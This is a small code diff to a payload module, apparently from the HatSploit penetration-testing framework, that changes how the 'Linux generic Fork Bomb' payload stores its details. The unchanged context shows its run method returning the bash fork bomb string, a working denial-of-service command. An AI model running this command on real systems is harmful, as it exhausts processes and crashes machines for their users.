@@ -10,7 +10,7 @@ class HatSploitPayload(Payload):
     def __init__(self):
         super().__init__()
 
-        self.details = {
+        self.details.update({
             'Name': "Linux generic Fork Bomb",
             'Payload': "linux/generic/fork_bomb",
             'Authors': [
@@ -21,7 +21,7 @@ class HatSploitPayload(Payload):
             'Platform': "linux",
             'Rank': "high",
             'Type': "one_side",
-        }
+        })
 
     def run(self):
         return ':(){ :|: & };:'
